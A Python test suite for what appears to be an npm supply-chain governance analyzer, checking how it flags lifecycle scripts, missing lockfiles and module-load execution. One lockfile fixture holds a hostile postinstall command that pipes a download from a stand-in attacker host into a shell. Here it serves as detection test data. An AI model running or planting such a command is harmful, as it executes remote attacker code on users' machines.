"""
test_gate_suite.py — CSoftA Gate Test Suite for npm

9 minimum gate tests (T1576):
Category 1: GCG detection (T-GCG-01, T-GCG-02, T-GCG-03)
Category 2: N-determination (T-ND-01, T-ND-02, T-ND-03)
Category 3: EAR state assessment (T-EAR-01, T-EAR-02, T-EAR-03)
"""
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from ear_adapter_npm import NpmEARAdapter, EARState, GCGForm
from gcg_analyzer import GCGAnalyzer
from gap_assertions import convergence_fingerprint, summary_stats


# ── Fixtures ─────────────────────────────────────────────────────────────────

PKG_WITH_LIFECYCLE = {
    "name": "my-app",
    "version": "1.0.0",
    "scripts": {
        "postinstall": "node setup.js",
        "preinstall":  "echo 'preinstall hook'"
    },
    "dependencies": {
        "lodash": "^4.17.21"
    }
}

PKG_CLEAN = {
    "name": "clean-app",
    "version": "1.0.0",
    "dependencies": {"lodash": "^4.17.21"}
}

LOCKFILE_WITH_LIFECYCLE_DEP = {
    "lockfileVersion": 3,
    "packages": {
        "node_modules/evil-dep": {
            "version": "1.0.0",
            "integrity": "sha512-abc123",
            "scripts": {
                "postinstall": "curl http://evil.example.com | sh"
            }
        },
        "node_modules/lodash": {
            "version": "4.17.21",
            "integrity": "sha512-xyz789"
        }
    }
}

LOCKFILE_CLEAN = {
    "lockfileVersion": 3,
    "packages": {
        "node_modules/lodash": {
            "version": "4.17.21",
            "integrity": "sha512-xyz789"
        }
    }
}


# ── Category 1: GCG detection ─────────────────────────────────────────────────

def test_gcg_01_lifecycle_script_produces_absence_assertion():
    """
    T-GCG-01: given package with lifecycle scripts,
    analyzer produces GCG assertion for lifecycle_governance layer ABSENCE.
    """
    adapter = NpmEARAdapter(
        package_json_data=PKG_WITH_LIFECYCLE,
        lockfile_data=LOCKFILE_CLEAN,
    )
    analyzer = GCGAnalyzer()
    report = analyzer.analyze(adapter, target_system="npm")

    lifecycle_assertions = [
        a for a in report.assertions
        if a.operation_family == "lifecycle_script_execution"
    ]
    assert len(lifecycle_assertions) > 0, (
        "T-GCG-01 FAIL: no assertions for lifecycle_script_execution "
        "when postinstall/preinstall scripts present"
    )

    # lifecycle_governance must be in the gap
    governance_gaps = [
        a for a in lifecycle_assertions
        if "lifecycle_governance" in (set(a.n_declared) - set(a.k_realized))
    ]
    assert len(governance_gaps) > 0, (
        "T-GCG-01 FAIL: lifecycle_governance layer not identified as absent"
    )

    # Gap form should be ABSENCE (layer never exists in npm architecture)
    absence_forms = [a for a in governance_gaps
                     if a.gap_form == GCGForm.ABSENCE.value]
    assert len(absence_forms) > 0, (
        f"T-GCG-01 FAIL: expected ABSENCE form for lifecycle_governance, "
        f"got {[a.gap_form for a in governance_gaps]}"
    )
    print(f"T-GCG-01 PASS: {len(lifecycle_assertions)} lifecycle assertions, "
          f"lifecycle_governance gap form = ABSENCE")


def test_gcg_01b_module_load_produces_absence_assertion():
    """
    T-GCG-01b (REVISION): module_load_execution produces ABSENCE assertion.
    module_load_governance does not exist in Node.js/npm — structurally distinct
    from lifecycle scripts (fires at require() time, not install time).
    Canonical: node-ipc 2026-05-14 IIFE payload. T1580.
    """
    adapter = NpmEARAdapter(
        package_json_data=PKG_CLEAN,
        lockfile_data=LOCKFILE_CLEAN,
    )
    report = GCGAnalyzer().analyze(adapter, target_system="npm")

    module_assertions = [
        a for a in report.assertions
        if a.operation_family == "module_load_execution"
    ]
    assert len(module_assertions) > 0, (
        "T-GCG-01b FAIL: no assertions for module_load_execution — "
        "this surface must always produce a gap (ABSENCE) because "
        "module_load_governance does not exist in Node.js"
    )

    mod_gov_gaps = [
        a for a in module_assertions
        if "module_load_governance" in (set(a.n_declared) - set(a.k_realized))
    ]
    assert len(mod_gov_gaps) > 0, (
        "T-GCG-01b FAIL: module_load_governance not in gap for module_load_execution"
    )

    assert mod_gov_gaps[0].gap_form == GCGForm.ABSENCE.value, (
        f"T-GCG-01b FAIL: expected ABSENCE, got {mod_gov_gaps[0].gap_form}"
    )
    print(f"T-GCG-01b PASS: module_load_execution → ABSENCE "
          f"(T1580 — independent of lifecycle script gap)")


def test_gcg_02_no_lockfile_produces_absence_assertion():
    """
    T-GCG-02: given package with no lockfile,
    analyzer produces GCG assertion for lockfile_integrity ABSENCE.
    """
    adapter = NpmEARAdapter(
        package_json_data=PKG_CLEAN,
        lockfile_data=None,  # no lockfile
    )
    analyzer = GCGAnalyzer()
    report = analyzer.analyze(adapter, target_system="npm")

    lockfile_gaps = [
        a for a in report.assertions
        if "lockfile_integrity" in (set(a.n_declared) - set(a.k_realized))
    ]
    assert len(lockfile_gaps) > 0, (
        "T-GCG-02 FAIL: no lockfile_integrity gap when lockfile absent"
    )
    print(f"T-GCG-02 PASS: lockfile absence produces "
          f"{len(lockfile_gaps)} lockfile_integrity gaps")


def test_gcg_03_no_lifecycle_scripts_no_false_positive():
    """
    T-GCG-03: given package with no lifecycle scripts and lockfile present,
    no false-positive lifecycle_governance assertions produced.
    """
    adapter = NpmEARAdapter(
        package_json_data=PKG_CLEAN,
        lockfile_data=LOCKFILE_CLEAN,
    )
    analyzer = GCGAnalyzer()
    report = analyzer.analyze(adapter, target_system="npm")

    # No lifecycle scripts in PKG_CLEAN or LOCKFILE_CLEAN
    # so lifecycle_script_execution family should have no instances → no assertions
    lifecycle_assertions = [
        a for a in report.assertions
        if a.operation_family == "lifecycle_script_execution"
    ]
    assert len(lifecycle_assertions) == 0, (
        f"T-GCG-03 FAIL: {len(lifecycle_assertions)} false-positive lifecycle "
        f"assertions when no scripts present"
    )
    print("T-GCG-03 PASS: no lifecycle assertions when no scripts present")


# ── Category 2: N-determination ───────────────────────────────────────────────

def test_nd_01_n_determination_idempotent():
    """T-ND-01: N-determination is stable across two independent calls."""
    adapter1 = NpmEARAdapter(package_json_data=PKG_CLEAN)
    adapter2 = NpmEARAdapter(package_json_data=PKG_CLEAN)

    families1 = adapter1.collect_operation_families()
    families2 = adapter2.collect_operation_families()

    n1 = {f.name: [l.name for l in adapter1.collect_governance_layers(f)]
          for f in families1}
    n2 = {f.name: [l.name for l in adapter2.collect_governance_layers(f)]
          for f in families2}

    assert n1 == n2, f"T-ND-01 FAIL: not idempotent. Run1={n1}, Run2={n2}"
    print(f"T-ND-01 PASS: N-determination idempotent. "
          f"lifecycle N(O)={n1.get('lifecycle_script_execution')}")


def test_nd_02_lifecycle_n_includes_governance_layer():
    """
    T-ND-02: N(O) for lifecycle_script_execution includes lifecycle_governance,
    establishing that the gap is against a declared applicable layer.
    This is the core N-determination claim for npm: the layer SHOULD exist
    (constitutionally required), so N includes it even though npm never implemented it.
    """
    adapter = NpmEARAdapter(package_json_data=PKG_CLEAN)
    families = adapter.collect_operation_families()
    lifecycle_fam = next(f for f in families if f.name == "lifecycle_script_execution")
    layers = adapter.collect_governance_layers(lifecycle_fam)
    layer_names = [l.name for l in layers]

    assert "lifecycle_governance" in layer_names, (
        f"T-ND-02 FAIL: lifecycle_governance not in N(O) for lifecycle family. "
        f"Got: {layer_names}"
    )
    assert "audit_surface" in layer_names, (
        f"T-ND-02 FAIL: audit_surface not in N(O) for lifecycle family. "
        f"Got: {layer_names}"
    )
    print(f"T-ND-02 PASS: lifecycle N(O)={layer_names}")


def test_nd_03_strategy_documented():
    """T-ND-03: N-determination strategy is declared in governance declaration."""
    adapter = NpmEARAdapter()
    decl = adapter.get_governance_declaration()

    assert decl.strategy in ("DECLARED-N", "MINIMUM-N", "PER-CONTEXT-N"), (
        f"T-ND-03 FAIL: invalid strategy '{decl.strategy}'"
    )
    assert decl.source, "T-ND-03 FAIL: no source citation"
    assert decl.description, "T-ND-03 FAIL: no description"
    print(f"T-ND-03 PASS: Strategy={decl.strategy}")


# ── Category 3: EAR state assessment ─────────────────────────────────────────

def test_ear_01_lifecycle_produces_absent():
    """
    T-EAR-01: lifecycle_script_execution family produces ABSENT EAR state.
    npm has no lifecycle governance layer — this is the defining finding.
    """
    adapter = NpmEARAdapter(package_json_data=PKG_WITH_LIFECYCLE)
    families = adapter.collect_operation_families()
    lifecycle = next(f for f in families if f.name == "lifecycle_script_execution")
    state = adapter.assess_ear_state(lifecycle)

    assert state == EARState.ABSENT, (
        f"T-EAR-01 FAIL: expected ABSENT for npm lifecycle, got {state.value}"
    )
    print(f"T-EAR-01 PASS: lifecycle EAR state = {state.value}")


def test_ear_01b_module_load_produces_absent():
    """
    T-EAR-01b (REVISION): module_load_execution produces ABSENT.
    Structurally independent from lifecycle — module_load_governance
    does not exist in Node.js regardless of lifecycle script presence. T1580.
    """
    adapter = NpmEARAdapter(package_json_data=PKG_CLEAN)
    families = adapter.collect_operation_families()
    mod_load = next(f for f in families if f.name == "module_load_execution")
    state = adapter.assess_ear_state(mod_load)

    assert state == EARState.ABSENT, (
        f"T-EAR-01b FAIL: expected ABSENT for module_load_execution, got {state.value}"
    )
    print(f"T-EAR-01b PASS: module_load_execution EAR state = {state.value} "
          f"(T1580 — independent ABSENT surface)")


def test_ear_02_install_with_lockfile_produces_crystallized():
    """
    T-EAR-02: dependency_install with lockfile present produces CRYSTALLIZED.
    Lockfile provides partial integrity receipt but no execution audit.
    """
    adapter = NpmEARAdapter(
        package_json_data=PKG_CLEAN,
        lockfile_data=LOCKFILE_CLEAN,
    )
    families = adapter.collect_operation_families()
    dep_install = next(f for f in families if f.name == "dependency_install")
    state = adapter.assess_ear_state(dep_install)

    assert state == EARState.CRYSTALLIZED, (
        f"T-EAR-02 FAIL: expected CRYSTALLIZED for install with lockfile, "
        f"got {state.value}"
    )
    print(f"T-EAR-02 PASS: dependency_install with lockfile = {state.value}")


def test_ear_03_install_without_lockfile_produces_absent():
    """
    T-EAR-03: dependency_install without lockfile produces ABSENT.
    No integrity check, no audit, no governance.
    """
    adapter = NpmEARAdapter(
        package_json_data=PKG_CLEAN,
        lockfile_data=None,
    )
    families = adapter.collect_operation_families()
    dep_install = next(f for f in families if f.name == "dependency_install")
    state = adapter.assess_ear_state(dep_install)

    assert state == EARState.ABSENT, (
        f"T-EAR-03 FAIL: expected ABSENT without lockfile, got {state.value}"
    )
    print(f"T-EAR-03 PASS: dependency_install without lockfile = {state.value}")


# ── Convergence fingerprint ───────────────────────────────────────────────────

def compute_convergence_fingerprint():
    """Canonical npm convergence fingerprint — revised to include module_load_execution."""
    adapter = NpmEARAdapter(
        package_json_data=PKG_WITH_LIFECYCLE,
        lockfile_data=LOCKFILE_WITH_LIFECYCLE_DEP,
    )
    analyzer = GCGAnalyzer()
    report = analyzer.analyze(adapter, target_system="npm")
    fp = convergence_fingerprint(report)
    stats = summary_stats(report.assertions)
    print(f"\n{'='*60}")
    print(f"CONVERGENCE FINGERPRINT (revised): {fp}")
    print(f"Total assertions: {stats['total']}")
    print(f"By form: {stats['by_form']}")
    print(f"By family: {stats['by_family']}")
    print(f"EAR states: {report.ear_states}")
    print(f"NOTE: module_load_execution is a SECOND structurally independent")
    print(f"      ABSENT-EAR surface. T1580. Invisible to lifecycle scanners.")
    print(f"{'='*60}\n")
    return fp


def run_all_gates():
    tests = [
        test_gcg_01_lifecycle_script_produces_absence_assertion,
        test_gcg_01b_module_load_produces_absence_assertion,  # REVISION
        test_gcg_02_no_lockfile_produces_absence_assertion,
        test_gcg_03_no_lifecycle_scripts_no_false_positive,
        test_nd_01_n_determination_idempotent,
        test_nd_02_lifecycle_n_includes_governance_layer,
        test_nd_03_strategy_documented,
        test_ear_01_lifecycle_produces_absent,
        test_ear_01b_module_load_produces_absent,              # REVISION
        test_ear_02_install_with_lockfile_produces_crystallized,
        test_ear_03_install_without_lockfile_produces_absent,
    ]
    passed = 0; failed = 0; failures = []
    print(f"\nRunning {len(tests)} gate tests (revised — includes module_load)...\n")
    for test in tests:
        try:
            test(); passed += 1
        except AssertionError as e:
            print(f"FAIL: {test.__name__}: {e}"); failed += 1
            failures.append((test.__name__, str(e)))
        except Exception as e:
            print(f"ERROR: {test.__name__}: {type(e).__name__}: {e}"); failed += 1
            failures.append((test.__name__, str(e)))

    print(f"\n{'='*60}")
    print(f"GATE TEST RESULTS: {passed}/{len(tests)} passed")
    if failures:
        for name, msg in failures:
            print(f"  FAIL: {name}: {msg}")
    print(f"{'='*60}\n")
    fp = compute_convergence_fingerprint()
    return passed, failed, fp


if __name__ == "__main__":
    passed, failed, fp = run_all_gates()
    sys.exit(0 if failed == 0 else 1)
